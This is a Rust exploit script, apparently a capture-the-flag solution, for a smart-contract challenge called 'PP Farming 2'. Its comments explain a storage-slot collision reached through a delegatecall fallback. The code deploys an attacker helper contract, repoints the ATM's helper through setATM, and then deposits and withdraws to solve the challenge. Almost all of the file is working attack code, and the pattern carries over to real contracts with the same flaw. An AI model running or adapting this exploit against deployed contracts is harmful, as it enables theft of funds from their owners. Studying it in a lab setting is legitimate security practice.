// PP Farming 2: storage-collision exploit via delegatecall hijack.
// PerformancePointHelper::atm and PerformancePointATM::performancePointHelper
// both sit at storage slot 1. fallback() delegatecalls anything except
// processWithdrawal into the helper, so setATM(evil) silently repoints the
// ATM's own storage. noReentrancy never fires, this isn't reentrant.
//
// deps: ethers = { version = "2", features = ["abigen"] }, tokio = { version = "1", features = ["full"] }, eyre = "0.6"

use ethers::prelude::*;
use ethers::utils::{format_ether, parse_ether};
use eyre::Result;
use std::sync::Arc;

abigen!(
    Atm,
    r#"[function donatePP(address) external payable function withdrawPP() external function isSolved() external view returns (bool) function performancePointHelper() external view returns (address) function setATM(address) external]"#
);
abigen!(EvilHelper, r#"[constructor()]"#);

const RPC_URL: &str = "http://REPLACE_RPC";
const PLAYER_KEY: &str = "REPLACE_PRIVKEY";
const ATM_ADDR: &str = "REPLACE_ATM";

#[tokio::main]
async fn main() -> Result<()> {
    let provider = Provider::<Http>::try_from(RPC_URL)?;
    let wallet: LocalWallet = PLAYER_KEY.parse::<LocalWallet>()?.with_chain_id(1u64);
    let client = Arc::new(SignerMiddleware::new(provider, wallet.clone()));
    let atm = Atm::new(ATM_ADDR.parse::<Address>()?, client.clone());

    println!("legit helper: {:?}", atm.performance_point_helper().call().await?);

    let evil = EvilHelper::deploy(client.clone(), ())?.send().await?;
    println!("evil helper deployed at {:?}", evil.address());

    atm.set_atm(evil.address()).send().await?.await?;
    println!("hijacked helper: {:?}", atm.performance_point_helper().call().await?);

    atm.donate_pp(wallet.address()).value(parse_ether("0.01")?).send().await?.await?;
    atm.withdraw_pp().send().await?.await?;

    println!("solved: {}", atm.is_solved().call().await?);
    Ok(())
}
